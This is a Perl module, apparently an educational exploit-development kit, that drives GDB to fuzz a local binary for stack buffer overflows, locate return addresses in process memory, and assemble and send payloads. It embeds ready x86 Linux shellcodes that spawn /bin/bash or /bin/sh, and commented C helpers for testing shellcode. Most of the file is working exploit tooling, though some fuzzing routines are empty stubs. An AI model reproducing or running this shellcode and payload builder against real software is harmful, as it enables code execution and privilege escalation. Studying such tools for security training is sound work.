#!/usr/bin/perl

#=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=\
# dbg.pm                                				|
#									|
# -*- coding: utf-8 -*-							|
#									|
# Perl module for fuzzing process and crafting shelcodes. 		|
#									|
# Dependencies :							|
# 		Devel::GDB						|
#               Data::Dumper                                            |
#									|
# For educational purpose only!          				|
#									|
# This program is free software: you can redistribute it and/or modify	|
# it under the terms of the GNU General Public License as published by	|
# the Free Software Foundation, either version 3 of the License, or	|
# (at your option) any later version.					|
#									|
# This program is distributed in the hope that it will be useful, 	|
# but WITHOUT ANY WARRANTY; without even the implied warranty of 	|
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the		|
# GNU General Public License for more details.				|
#									|
# You should have received a copy of the GNU General Public License	|
# along with this program.  If not, see <http://www.gnu.org/licenses/>.	|
#									|
#=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=~=/

package dbg;
use strict;
use warnings;

BEGIN{ 
	use Exporter;
	use vars qw($VERSION @ISA @EXPORT @EXPORT_OK %EXPORT_TAGS);
	$VERSION = '1.0001';
	@ISA = qw(Exporter);
	@EXPORT = qw();
	@EXPORT_OK = qw(&getDbg &getPid &getSym &getBof &getMem &fndMem &setPld &sndPld &bye $verbose $debug $timer %shc);
	%EXPORT_TAGS = ( );
}

use vars @EXPORT_OK;
$verbose = 0;
$debug = 0;
$timer = 0;
%shc = ( 
	'bash'=> "\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52"
		."\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e"
		."\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80",
	'sh00'=> "\x31\xc0\x31\xd2\x31\xdb\x31\xc9\xb0\x46\x80\xc3"
    		."\x01\xfe\xcb\x88\xd9\xcd\x80\xeb\x0c\xb0\x0b\x5b"                        
        	."\x89\xd1\xcd\x80\x31\xc0\x40\xcd\x80\xe8\xef\xff"
        	."\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
);

#my $mshc=<<MSHC;

#//makeshellcode.c
#include <stdio.h>

#void sh();

#int main(){
#	char * ptr = (char *) shc;
#	printf("char shc[] = \n\"");
#	while(*ptr != 0){
#  		printf("\\x%.2x",*ptr & 0xff);
#  		ptr++;
#	}
#	printf("\";\n");
#} 
#MSHC

# my $tshc=<<TSHC;
#
#//testshellcode.c
#include <stdio.h>
#include "shellcode.h"
#
#int main(){
#	printf("taille : %d\n",sizeof(shellcode)-1);
#	int *ret;
#	*( (int *) &ret + 2) = (int) shellcode;
#}
#TSHC

use Switch; 
use Devel::GDB;
use Data::Dumper;
my $gdb = new Devel::GDB('-params' => '-q -n');

sub spk($$){
	my ( $mode, $text ) = @_;
	switch( $mode ){
		case( 'v' ) 	{ if($verbose){ print($text); } }
		case( 'd' ) 	{ if($debug){ print($text); } }
		else 		{ print($text); }	
	}	
}

sub getDbg($){
	spk( 'v', "[+]: Initializing Debugging Environment" );
	if( -f $_[0] ){	
		spk( 'v', "\n[+]: Loading $_[0] in Debug Mode " );
		$gdb->get( "file $_[0]" );
	} else {
		spk( 'v' , "\n[-]: $_[0] isn't a file !\n" );
		exit;
	}	
}

sub dec2hex($){
	return( unpack( "H*", pack( "N", $_[0] ) ) );
}

sub run(){
	return( $gdb->get( 'r' ) );	
}

sub setArg($){
	return( $gdb->get( "set arg $_[0]" ) );
}

sub setBrk($){
	spk( 'v', "\n[+]: Setting Breakpoint at $_[0] " ); 
	return( $gdb->get( "b *".$_[0] ) );
}

sub delBrk($){
	spk( 'v', "\n[+]: Clearing Breakpoint at $_[0] " );
	return( $gdb->get( "clear *".$_[0] ) );
}

sub disass($){
	return( split( /\n/, $gdb->get( "disass $_[0]" ) ) );
}
sub shwMem($){
	return( split( /:/, $gdb->get( "x/x 0x".dec2hex( $_[0] ) ) ) );	
}

sub getReg($){
	my @reg= split( / /, $gdb->get( "p \$$_[0]" ) );
	foreach( @reg ){
		if( grep( /0x/, $_ ) ){
			chop( $_ );
			spk( 'd', "\n[*]: Register \$$_[0] is at $_  " );
			return( $_ );
		}
	}
}

sub getPid(){
	spk( 'v', "\n[+]: Getting PID of child process : " );
	my @pid = split( / /, $gdb->get( 'i program' ) );
	@pid = split( /\n/, $pid[7] );
	chop( $pid[0] );
	spk( 'v', "$pid[0] " );
	return( $pid[0] );
}

sub getSym($){
	spk( 'v', "\n[+]: Searching $_[0] in main function " );
	foreach( disass( 'main' ) ){
		if( grep /$_[0]/, $_ ){
			my @ret = split( / /, $_ );
            		if( !( grep /0x/, $ret[0] ) ){
                		spk( 'v', "\n[-]: $_[0] not found in main function\n" );
                		exit;
            		}
            		spk( 'v', "\n[+]: Found $_[0] at $ret[0]" );
            		return( $ret[0] );
        	} 
    	}
}

sub fuzBin($@){
	my ($sub, @args) = @_;
	spk( 'v', "\n[+]: Fuzzing::" );

    	sub bof(@){
        	my ( $brk, $pad ) = @_;
        	setBrk( $brk );
        	spk( 'v', "bof :" );
        	while( 1 ){
            		setArg( "\x90" x $pad ); run();
            		my $ebp = getReg( 'ebp' );
            		my $eip = getReg( 'eip' );
            		spk( 'd', "\n[*]REG: (ebp:$ebp,eip:$eip)" );
            		if( grep /0x90909090/, $ebp ){
                		spk( 'v', " EBP ($ebp) being rewrite over ".( $pad - 4 )." arguments " ); 
                		#($pad -= 4)??
                		delBrk( $brk );
                		return( $pad );
                		last;
            		}
            		$pad++;
            		sleep( $timer );
        	}
    	}     

    	sub sof(@){ }
    	sub iof(@){ }
    	sub hof(@){ }
    	sub ril(@){ }
    	sub rir(@){ }

    	switch($sub){
        	case('bof') { bof(@args); } #buffer overflow
        	case('sof') { sof(@args); } #stack overflow
        	case('iof') { iof(@args); } #integer overflow
        	case('hof') { hof(@args); } #heap overflow
        	case('ril') { ril(@args); } #ret into libc
        	case('rir') { rir(@args); } #ret into ret
        	case('str') { str(@args); } #format string
    	}
}

sub getBof($$){
my ( $brk, $pad ) = @_;
    setBrk( $brk ); 
    spk( 'v', "\n[+]: Fuzzing::StackBasedBufferOverflow :" ); 
    while( 1 ){
        setArg( "\x90" x $pad ); 
        run();
        my $ebp = getReg( 'ebp' );
        my $eip = getReg( 'eip' );
        spk( 'd', "\n[*]REG: (ebp:$ebp,eip:$eip)" );
        if( grep( /0x90909090/, $ebp) ){ 
        	spk( 'v', " EBP ($ebp) being rewrite over ".( $pad - 4 )." arguments " ); 
            #($pad -= 4)??
            delBrk( $brk );
            return( $pad );
            last;
        }
        $pad++;
	    sleep( $timer );
    }
}

sub getMem($$){
    my ( $pid, $perm ) = @_; 
    spk( 'v', "\n[+]: Getting $perm memory sections for pid : $pid " );
    my $bin = `pidstat | grep '$pid' | cut -d " " -f29`;
    my @mem = split( /\n/, `cat /proc/$pid/maps |grep '$perm' |grep -i '$bin'|cut -d' ' -f1` );
    return( @mem );
}

sub fndMem($@){
    my ( $pat, @mem ) = @_; 
    spk( 'v', "\n[+]: Searching $pat " );
    foreach( @mem ){
        my @mRange = split( /-/, $_ ); 
        spk( 'v', "from 0x$mRange[0] to 0x$mRange[1] " );
        for( my $i = hex( $mRange[0] ); $i < hex( $mRange[1] ); $i++ ){
            my @tab = shwMem( $i );
            my @ret = split( / /, $tab[0] );
            $tab[1] =~ s/\t//;
            chop( $tab[1] ); 
            spk( 'd', "\n[*]SEG: ($tab[1] at $ret[0])" ); 
            if( grep( /$pat/, $tab[1] ) ){ 
            	spk( 'v', "\n[+]: $pat ($tab[1]) found at $ret[0]" );
                return( $ret[0] );
                last;
            }
            sleep( $timer );
        }
    }
    bye(); 
    spk( 'v', "\n[-]: $pat not found ! \n" );
    exit;
}

sub setPld($$$$){
    my ( $pad, $jmp, $op, $shc ) = @_;
    #TODO: Rajout de $pldtype au prototype
    spk( 'v', "\n[+]: Crafting Payload : ( $pad NOPs | \@$jmp | /bin/bash ) " );
    #TODO: $pldtype = "( $pad NOPs | \@$jmp | /bin/bash )" 
    my $pld = ( $op x $pad );
    $jmp = pack( "L", hex( $jmp ) );
    $pld = $pld.$jmp.$shc;
    return( $pld );
}

sub sndPld($){
    my( $pld ) = @_; 
    spk( 'v', "\n[+]: Sending payload :" );
    setArg( $pld );
    my @ret = reverse( split( /\n/, run() ) );
    if( grep( /SIGSEGV/, $ret[1] ) ){ 
    	spk( 'v', " Segmentation fault (ebp:".getReg( 'ebp' ).",eip:".getReg( 'eip' ).") " ); 
        #if( $debug ){ $gdb->send_cmd( 'backtrace' ); }
        return( 1 );
    } elsif( grep( /SIGKILL/, $ret[1] ) ){ 
    	spk( 'v', " Illegal instruction (ebp:".getReg( 'ebp' ).",eip:".getReg( 'eip' ).") " );
    	if( $debug ){ $gdb->send_cmd( 'backtrace' ); }
        return( 1 );
    } else { 
    	spk( 'v', " Success !" );
        return( 0 );
    }
}

sub bye($){
    $gdb->end();
    print( $_[0] ); 
}

END{
    return( 0 );
}
